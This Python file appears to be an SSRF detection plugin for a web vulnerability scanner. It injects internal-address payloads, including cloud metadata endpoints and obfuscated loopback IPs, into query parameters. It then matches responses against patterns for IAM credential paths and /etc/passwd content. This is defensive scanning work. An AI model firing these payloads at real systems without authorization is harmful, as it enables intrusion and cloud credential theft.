# vibee_hacker/plugins/blackbox/ssrf.py
"""SSRF (Server-Side Request Forgery) detection plugin."""

from __future__ import annotations

import re
import shlex
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from vibee_hacker.core.models import Target, Result, Severity, InterPhaseContext
from vibee_hacker.core.plugin_base import PluginBase

# Internal URL payloads to inject
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://localhost",
    "http://0177.0.0.1",           # octal
    "http://2130706433",            # decimal IP
    "http://0x7f000001",            # hex IP
    "http://127.0.0.1.nip.io",     # DNS rebinding
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
]

# Patterns that indicate SSRF success (internal data returned)
SSRF_DETECTION_PATTERNS = [
    re.compile(r"ami-[a-f0-9]+", re.I),            # AWS AMI ID
    re.compile(r"instance-id", re.I),               # AWS metadata key
    re.compile(r"instance-type", re.I),             # AWS metadata key
    re.compile(r"local-ipv4", re.I),                # AWS metadata key
    re.compile(r"iam/security-credentials", re.I),  # AWS IAM creds path
    re.compile(r"root:x:0:0", re.I),                # /etc/passwd content
    re.compile(r"<title>.*localhost.*</title>", re.I),  # Localhost page title
    re.compile(r"169\.254\.169\.254", re.I),        # Metadata IP reflected
    re.compile(r"metadata\.google\.internal", re.I),  # GCP metadata
    re.compile(r"computeMetadata", re.I),           # GCP metadata key
]

MAX_PARAMS = 10


class SsrfPlugin(PluginBase):
    name = "ssrf"
    description = "SSRF detection: inject internal URLs into parameters"
    category = "blackbox"
    phase = 3
    base_severity = Severity.CRITICAL
    detection_criteria = "Internal URL reflected with metadata patterns in response"
    expected_evidence = "SSRF payload triggers internal data disclosure"

    async def run(self, target: Target, context: InterPhaseContext | None = None) -> list[Result]:
        if not target.url:
            return []

        # Build list of URLs to test: start URL + crawled URLs that have query params
        urls_to_test: list[str] = [target.url]
        if context:
            for crawled_url in (context.crawl_urls or [])[:10]:
                if crawled_url != target.url and "?" in crawled_url:
                    urls_to_test.append(crawled_url)

        results: list[Result] = []
        async with httpx.AsyncClient(verify=target.verify_ssl, timeout=10) as client:
            for test_target_url in urls_to_test:
                parsed = urlparse(test_target_url)
                params = parse_qs(parsed.query)
                if not params:
                    continue

                capped_params = dict(list(params.items())[:MAX_PARAMS])

                # Fetch baseline response
                try:
                    baseline_resp = await client.get(test_target_url)
                except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                    continue

                baseline_text = baseline_resp.text

                for param_name, values in capped_params.items():
                    for payload in SSRF_PAYLOADS:
                        test_params = {k: v[0] for k, v in capped_params.items()}
                        test_params[param_name] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        try:
                            resp = await client.get(test_url)
                        except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                            continue

                        if len(resp.text) > 1_000_000:  # 1MB max response
                            continue

                        # Skip if response is identical to baseline (payload ignored)
                        if resp.text == baseline_text:
                            continue

                        for pattern in SSRF_DETECTION_PATTERNS:
                            if pattern.search(resp.text) and not pattern.search(baseline_text):
                                results.append(Result(
                                    plugin_name=self.name,
                                    base_severity=self.base_severity,
                                    title=f"SSRF in parameter '{param_name}'",
                                    description=(
                                        f"Server-Side Request Forgery detected with payload: {payload}. "
                                        f"Internal data pattern found in response."
                                    ),
                                    evidence=pattern.pattern,
                                    cwe_id="CWE-918",
                                    endpoint=test_target_url,
                                    param_name=param_name,
                                    curl_command=f"curl {shlex.quote(test_url)}",
                                    rule_id="ssrf_internal_access",
                                    recommendation=(
                                        "Validate and whitelist allowed URL schemes and hosts. "
                                        "Use a server-side allowlist and block internal/private IP ranges."
                                    ),
                                ))
                                return results  # Stop on first confirmed finding

        return results
